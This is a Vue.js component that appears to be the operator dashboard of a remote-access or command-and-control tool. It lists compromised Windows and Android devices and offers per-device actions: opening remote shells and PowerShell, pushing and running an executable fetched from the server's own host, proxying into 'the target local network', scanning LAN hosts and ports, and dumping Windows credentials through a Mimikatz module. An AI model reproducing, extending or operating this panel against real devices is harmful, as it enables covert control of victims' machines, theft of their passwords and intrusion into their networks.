<template>

    <v-card>
      <NavDrawer :drawerBool="this.$store.state.drawerShow"
      v-on:to-signOut="signOut"
      v-on:to-switchCore="switchCore"
      />
      <v-container grid-list-lg>
        <v-row dense class="card-body" fluid align="start">
          <v-col
            v-for="(item, i) in devicesX"
            :key="i"
            cols="12"
          >
            <v-card
              :color="item.color"
              dark
              
            >
              <div class="d-flex flex-no-wrap justify-space-between">
                <div>
                  <v-card-title
                    class="headline"
                    v-text="shortenText(item.uuid, 10)"
                  ></v-card-title>
                  <v-card-subtitle v-html="'IP : '+item.deviceInfo[0]+'<br />Active tasks : '+item.deviceInfo[1]"></v-card-subtitle>
              <v-card-actions>
              <router-link :to="'shell/'+item.uuid+'/'+item.ThreadID+'/sh'" target="_blank">
                <v-btn text>Open shell</v-btn>
              </router-link>

              <v-menu
                transition="slide-x-transition"
                bottom
                right
              >
                <template v-slot:activator="{ on, attrs }">
                  <v-btn
                    v-bind="attrs"
                    v-on="on"
                    text
                  >
                    <v-icon>mdi-dots-vertical</v-icon>
                  </v-btn>
                </template>

                <v-list>
                  <v-list-item
                    v-for="(option, i) in deviceOptions[item.devicePlatform]"
                    :key="i"
                    @click="runOption(item.uuid, option.option, item.ThreadID)"
                  >
                    <v-list-item-title>{{ option.title }}</v-list-item-title>
                    <v-list-item-icon><v-icon>{{ option.icon }}</v-icon></v-list-item-icon>
                  </v-list-item>
                </v-list>
              </v-menu>


              </v-card-actions>

                </div>
                <v-avatar
                  class="ma-3"
                  size="125"
                  tile
                >
                  <v-img :src="item.src"></v-img>
                </v-avatar>
              </div>
            </v-card>
          </v-col>

        </v-row>
      </v-container>





    <v-snackbar
      v-model="snackbar"
    >
      {{ snackbarText }}

      <template v-slot:action="{ attrs }">
        <v-btn
          color="pink"
          text
          v-bind="attrs"
          @click="snackbar = false"
        >
          Close
        </v-btn>
      </template>
    </v-snackbar>


    <v-overlay :value="overlay">
        <template v-if="downDialog">

          <div class="text-center">
            <v-dialog
              v-model="downDialog"
              width="500"
            >
              <v-card>
                <v-card-title dark class="headline lighten-2">
                  Send file from url
                </v-card-title>

                <v-card-text>
                    <v-text-field
                    label="Direct link"
                    placeholder="http://example.com/executable"
                    hint="http only (https not supported yet)"
                    :rules="httprule"
                    outlined
                    v-model="deviceTarget.url"
                    ></v-text-field>
                    <v-text-field
                    label="Output file"
                    outlined
                    v-model="deviceTarget.output"
                    ></v-text-field>
                </v-card-text>

                <v-divider></v-divider>

                <v-card-actions>
                  <v-btn
                    color="primary"
                    text
                    @click="downDialog = false;"
                  >
                    Cancel
                  </v-btn>
                  <v-spacer></v-spacer>
                  <v-btn
                    color="primary"
                    text
                    @click="downFile"
                  >
                    Download
                  </v-btn>
                </v-card-actions>
              </v-card>
            </v-dialog>
          </div>


        </template>
        <template v-else-if="proxyDialog">


          <div class="text-center">
            <v-dialog
              v-model="proxyDialog"
              width="500"
            >
              <v-card :loading="proxyLoading">
                <v-card-title dark class="headline lighten-2">
                  Proxy settings
                </v-card-title>

                <v-card-text>
                  <v-icon left>info</v-icon>This feature allows you to access the target local network (router, other devices connected to his LAN ... etc)
                  <template v-if="proxyInfo">
                    <br /><br />
                    <v-text-field
                    label="HTTP proxy (IP Address:Port)"
                    hint="Copied to clipboard"
                    outlined
                    readonly
                    v-model="deviceTarget.proxyInfo"
                    ref="proxyToCopy"
                    append-icon="mdi-content-copy"
                    @click:append="copyText"
                    @click="copyText"
                    ></v-text-field>
                  </template>
                </v-card-text>

                <v-divider></v-divider>

                <v-card-actions>

                  <v-btn
                    color="primary"
                    text
                    @click="proxyDialog = false; proxyInfo = false"
                  >
                    Hide me
                  </v-btn>
                  <v-spacer></v-spacer>
                  <v-btn
                    color="primary"
                    text
                    @click="switchProxy"
                    :disabled="proxyLoading"
                  >
                    {{ proxyText }}
                  </v-btn>
                  

                </v-card-actions>
              </v-card>
            </v-dialog>
          </div>

        </template>


        <template v-else-if="lanDialog">

          <div class="text-center">
            <v-dialog
              v-model="lanDialog"
              width="500"
            >

              <v-card :loading="discoveryLoading">
                <v-card-title dark class="headline lighten-2">
                  Access Local Network
                </v-card-title>

                <v-card-text>
                  <v-icon left>info</v-icon>This feature allows you to discover alive hosts on the local network and scan for open ports
                  <template v-if="deviceTarget.lanSchema.length>0">
                    <v-treeview :items="deviceTarget.lanSchema">
                      <template v-slot:prepend="{ item }">
                        <v-icon
                          v-if="!item.port"
                          v-text="'mdi-folder-network'"
                        ></v-icon>
                        <v-icon
                          v-else
                          v-text="'mdi-arrow-right-circle-outline'"
                          color="green"
                        ></v-icon>
                      </template>
                      <template v-slot:append="{ item }">

                        <v-tooltip bottom v-if="!item.port">
                          <template v-slot:activator="{ on, attrs }">
                            <v-icon
                              color="primary"
                              dark
                              v-bind="attrs"
                              v-on="on"
                              :disabled="scannedPorts[item.name] ? true : false"
                              @click="scanPort(item.name)"
                            >
                              mdi-magnify
                            </v-icon>
                          </template>
                          <span>Scan for open ports</span>
                        </v-tooltip>

                      </template>
                    </v-treeview>
                  </template>
                </v-card-text>

                <v-divider></v-divider>

                <v-card-actions>
                  <v-btn
                    color="primary"
                    text
                    @click="lanDialog = false"
                  >
                    Hide me
                  </v-btn>
                  <v-spacer></v-spacer>
                  <v-btn
                    color="primary"
                    text
                    :disabled="discoverDisabled"
                    @click="scanLAN"
                  >
                    Discover LAN
                  </v-btn>
                  

                </v-card-actions>
              </v-card>


            </v-dialog>
          </div>

        </template>



        <template v-else-if="dumpCredDialog">

          <div class="text-center">
            <v-dialog
              v-model="dumpCredDialog"
              width="500"
            >
              <v-card :loading="mimikatzLoading">
                <v-card-title dark class="headline lighten-2">
                  Dump Credentials
                </v-card-title>

                <v-card-text>
                  <v-icon left>info</v-icon>This model runs a Powershell script to dump windows credentials, this may get you plaintext passwords stored in memory (Windows versions up to 8 and 2012 / WDigest is enabled by default)

                  <template v-if="deviceTarget.dumpSchema.length>0">
                    <v-textarea
                      name="input-7-1"
                      label="Default style"
                      :value="deviceTarget.dumpSchema"
                    ></v-textarea>
                  </template>

                </v-card-text>


                <v-divider></v-divider>

                <v-card-actions>

                  <v-btn
                    text
                    @click="dumpCredDialog = false;"
                  >
                    Hide me
                  </v-btn>
                  <v-spacer></v-spacer>
                  <v-btn
                    color="warning"
                    text
                    @click="runMimikatz"
                  >
                    Run
                  </v-btn>
                </v-card-actions>
              </v-card>
            </v-dialog>
          </div>

        </template>




        <template v-else-if="clearDialog">

          <div class="text-center">
            <v-dialog
              v-model="clearDialog"
              width="500"
            >
              <v-card>
                <v-card-title dark class="headline lighten-2">
                  Clear activities
                </v-card-title>

                <v-card-text>
                  <v-icon left>warning</v-icon>This will stop all pending shell commands and kill the proxy if it's running. Do you confirm?
                </v-card-text>

                <v-divider></v-divider>

                <v-card-actions>

                  <v-btn
                    text
                    @click="clearDialog = false;"
                  >
                    Cancel
                  </v-btn>
                  <v-spacer></v-spacer>
                  <v-btn
                    color="warning"
                    text
                    @click="runClear"
                  >
                    Confirm
                  </v-btn>
                </v-card-actions>
              </v-card>
            </v-dialog>
          </div>




        </template>
        
    </v-overlay>

    </v-card>
</template>

<script>
import NavDrawer from '@/components/NavDrawer.vue';

export default {
  name: 'HomeCore',
  components:{
    NavDrawer,

  },
  methods: {
        switchCore(val){
          this.$emit('to-switchCore', val);
        },
        signOut() {
          this.$emit('to-signOut');
        },
        colorGen(val){
          let string_map = {0: 26, 1: 27, 2: 28, 3: 29, 4: 30, 5: 31, 6: 32, 7: 33, 8: 34, 9: 35, 'a': 0, 'c': 2, 'b': 1, 'e': 4, 'd': 3, 'g': 6, 'f': 5, 'i': 8, 'h': 7, 'k': 10, 'j': 9, 'm': 12, 'l': 11, 'o': 14, 'n': 13, 'q': 16, 'p': 15, 's': 18, 'r': 17, 'u': 20, 't': 19, 'w': 22, 'v': 21, 'y': 24, 'x': 23, 'z': 25};
          var string_equ = "";
          for(var i=0; i<Math.min(val.length, 6);i++){
            if(val[i]!==undefined){
              string_equ += string_map[val[i]]
            }else{
              string_equ += "00"
            }
          }
          let mycolor = '#'+(Math.abs(0.5-parseInt(string_equ)/999999)*0xFFFFFF<<0).toString(16);
          return mycolor;
        },
        /* eslint-disable */
        
        runOption(uuid, option, ThreadID){
          for(var j=0; j<this.devicesX.length; j++){if(this.devicesX[j].uuid==uuid){this.deviceTarget = this.devicesX[j];break}}
          if(option == 'download'){
            this.downDialog = true;

          }else if(option == 'proxy'){
            this.proxyDialog = true;
            if(this.deviceTarget.proxyInfo!=''){
              this.proxyInfo = true;
              this.proxyText = "Kill proxy";
            }else{
              this.proxyInfo = false;
              this.proxyText = "Create proxy";
            }
          }else if(option == 'clear'){
            this.clearDialog = true;

          }else if(option == 'modules_Discover'){
            this.lanDialog = true;
            if(this.deviceTarget.lanSchema.length===0){
              this.discoverDisabled = false;
            }else{
             this.discoverDisabled = true; 
            }

          }else if(option == 'modules_mimikatz'){
            this.dumpCredDialog = true;

          }else if(option == 'powershell'){            
            let routeData = this.$router.resolve('/shell/'+uuid+'/'+ThreadID+'/ps');
            window.open(routeData.href, '_blank');
          }
        },
        /* eslint-enable */
        async runShell(uuid, cmd, ThreadID){
          let taskInfo = {uuid, cmd, ThreadID};
          let ShellResp = await this.$store.dispatch('addTask', taskInfo);
          return ShellResp;
        },
        async downFile(){
          this.downDialog = false;
          let uuid = this.deviceTarget.uuid;
          let output = this.deviceTarget.output;
          let boolDown = await this.$store.dispatch('pushDownload', {uuid, url: this.deviceTarget.url, output});
          if(boolDown=='1' && this.deviceTarget.devicePlatform=='Android'){
            this.snackbarText = 'The file is scheduled to download in the next App booting';
            this.snackbar = true;
          }else if (boolDown=='1'){
            this.snackbarText = 'Downloading ... Use shell to check status';
            this.snackbar = true;
          }
          else{
            this.snackbarText = 'Error, please try again';
            this.snackbar = true;
          }
        },
        async runProxy(){
          this.proxyLoading = true;
          this.proxyText = 'Kill proxy';
          let deviceInfo = {uuid:this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID};
          let resProxy = await this.$store.dispatch('runProxy', deviceInfo);
          if (resProxy.error) {
            alert("Error: please try again/later");  
          }else{
              this.deviceTarget.proxyInfo = resProxy.proxyInfo;
              this.proxyInfo = true;
              this.proxyLoading = false;
              for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}
          }
        },

        async runMimikatz(){
          this.mimikatzLoading = true;
          let deviceInfo = {uuid: this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID, moduleID: 3};
          let resDiscovery = await this.$store.dispatch('runmodule', deviceInfo);
          if (resDiscovery.error){
            alert("Error: please try again/later");
          }else{
            this.deviceTarget.dumpSchema = resDiscovery.message;
            this.mimikatzLoading = false;
            for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}
          }
        },

        async scanLAN(){
          this.discoveryLoading = true;
          this.discoverDisabled = true;
          let deviceInfo = {uuid: this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID, moduleID: 1};
          let resDiscovery = await this.$store.dispatch('runmodule', deviceInfo);
          if (resDiscovery.error){
            alert("Error: please try again/later");
          }else{
            let aliveHosts = resDiscovery.message.substring(1, resDiscovery.message.length-1).replace(/'/g, "").split(',');
            let nbHosts = aliveHosts.length;
            let schemaStruct = []
            for(var i=0;i<nbHosts;i++){
              schemaStruct.push({id:i, name: aliveHosts[i].replace(" ", ""), icon: "'mdi-folder-network'",  children: []})                
            }
            this.deviceTarget.lanSchema = schemaStruct;
            this.lanSchema = true;
            this.discoveryLoading = false;
            for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}
          }
        },
        async scanPort(LanIP){
          this.scannedPorts[LanIP] = true;
          this.discoveryLoading = true;
          let deviceInfo = {uuid: this.deviceTarget.uuid, ThreadID: this.deviceTarget.ThreadID, moduleID: 2,
          LanIP: LanIP};
          let resDiscovery = await this.$store.dispatch('runmodule', deviceInfo);
          let openPortsMsg = resDiscovery.message.substring(1, resDiscovery.message.length-1).replace(/'/g, "").split(',');
          
          for(var i=0;i<this.deviceTarget.lanSchema.length;i++){
            if (this.deviceTarget.lanSchema[i].name==LanIP){
              this.deviceTarget.lanSchema[i].children = []
              let portObjArr = [];
              for(var j=0;j<openPortsMsg.length;j++){
                let portObjTmp = {id:100+j, name: openPortsMsg[j].replace(" ", ""), port: true, icon: "'mdi-eye-off'"};
                if(parseInt(portObjTmp.name)>0) portObjArr.push(portObjTmp);
              }
              this.deviceTarget.lanSchema[i].children = portObjArr;
              for(var k=0; k<this.devicesX.length; k++){if(this.devicesX[k].uuid==this.deviceTarget.uuid){this.devicesX[k] = this.deviceTarget;break}}
            }
          }
          this.discoveryLoading = false;

        },
        async switchProxy(){
          if (this.proxyText=='Create proxy'){
            this.runProxy();
          }else{
            this.killProxy();
          }
        },
        async runClear(){
          this.clearDialog = false;
          this.killProxy();
          let respClear = await this.$store.dispatch('runClear', {uuid: this.deviceTarget.uuid});
          if (respClear.error) {
            this.snackbarText = 'Error, please try again';
            this.snackbar = true; 
          }else{
            this.snackbarText = 'All activities has been cleared';
            this.snackbar = true; 
          }
        },
        async killProxy(){
          this.deviceTarget.proxyInfo = '';
          this.proxyInfo = false;
          this.proxyText = "Create proxy";
          this.proxyLoading = true;
          let respClear = await this.$store.dispatch('killProxy', {uuid: this.deviceTarget.uuid});
          if (respClear.error) {
            this.snackbarText = 'Error, please try again';
            this.snackbar = true; 
          }else{
            this.snackbarText = 'Proxy was killed, you can now initiate another one';
            this.snackbar = true; 
          }
          this.proxyLoading = false;
        },
        async getDevices(){
          let devicesJSON = await this.$store.dispatch('getDevices');
          return devicesJSON;
        },
        pushDevices(){
          this.devicesX = [];
          let arr_length = this.$store.state.core.devicesID.length;
          for(var i=0; i<arr_length; i++){
            let struct_dev = {color: this.colorGen(this.$store.state.core.devicesID[i])
            , src: require('../assets/deviceIcon/'+this.$store.state.core.devicesPlatform[i].split(' ')[0]+'.svg')
            , uuid: this.$store.state.core.devicesID[i]
            , ThreadID: this.$store.state.core.devicesThreadID[i]
            , devicePlatform: this.$store.state.core.devicesPlatform[i].split(' ')[0]
            , url: 'http://{API_FQDN}/assets/runFrame_x86'
            , output: 'execbin'
            , proxyInfo: ''
            , lanSchema: ''
            , dumpSchema: ''
            , deviceInfo: [this.$store.state.core.devicesIP[i]
            , this.$store.state.core.activeTasks[i].length],};
            this.devicesX.push(struct_dev);
          }
        },
        shortenText(source, size) {
          return source.length > size ? source.slice(0, size - 1) + "…" : source;
        },
        copyText() {
          let proxyInfoCopy = this.$refs.proxyToCopy.$el.querySelector('input')
          proxyInfoCopy.select()
          document.execCommand("copy");
        },
        clearDialogMethod(){
          this.clearDialog = false;
        }

  },

  data: () => ({
    deviceOptions: 
    {
      "Windows":  [
        {title : 'Discover LAN', icon: 'mdi-router-wireless', 'option': 'modules_Discover'},
        {title: 'Instant download', icon: 'mdi-download' , option:'download'},
        {title: 'Powershell', icon: 'mdi-powershell' , option:'powershell'},
        {title : 'Dump credentials', icon: 'mdi-lock', 'option': 'modules_mimikatz'},
        {title: 'Proxy settings', icon: 'mdi-server' , option: 'proxy'},
        {title: 'Clear activities', icon: 'mdi-delete-sweep' , option: 'clear'},
      ],
      "Android":  [
        { title : 'Discover LAN', icon: 'mdi-router-wireless', 'option': 'modules_Discover'},
        { title: 'Schedule download', icon: 'mdi-download' , option:'download'},
        { title: 'Proxy settings', icon: 'mdi-server' , option: 'proxy'},
        { title: 'Clear activities', icon: 'mdi-delete-sweep' , option: 'clear'},
      ],

    },
    devicesX: [
    ],
    snackbarText: '',
    snackbar: false,
    overlay: false,
    downDialog: false,
    proxyDialog: false,
    lanDialog: false,
    dumpCredDialog: false,
    clearDialog: false,
    proxyInfo: false,
    lanSchema: false,
    proxyLoading: false,
    discoveryLoading: false,
    discoverDisabled: false,
    mimikatzLoading: false,
    portRange: false,
    proxyText: "Create proxy",
    httprule: [
      value => !!value || 'Required.',
      value => (value || '').toLowerCase().indexOf('https://')<0 || 'HTTPS not allowed',
      value => {
        const pattern = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&//=]*)/
        return pattern.test(value) || 'Invalid link.'
      },
    ],
    deviceTarget: {
      url: 'http://{API_FQDN}/assets/runFrame_x86',
      output: 'execbin',
      uuid: '',
      ThreadID: '',
      proxyInfo: '',
      lanSchema: ''
    },
    scannedPorts: []
  }),
  created() {
      this.getDevices().then(this.pushDevices);
  },
  watch: {
    downDialog(val) {
      this.overlay = val;
    },
    proxyDialog(val) {
      this.overlay = val;
    },
    clearDialog(val) {
      this.overlay = val;
    },
    lanDialog(val) {
      this.overlay = val;
    },
    dumpCredDialog(val) {
      this.overlay = val;
    },
  }
}
</script>

<style scoped>
.scroll-y {
   overflow-y: auto
}

.card-body {
  overflow-y: scroll;
  height: 83vh;
}
</style>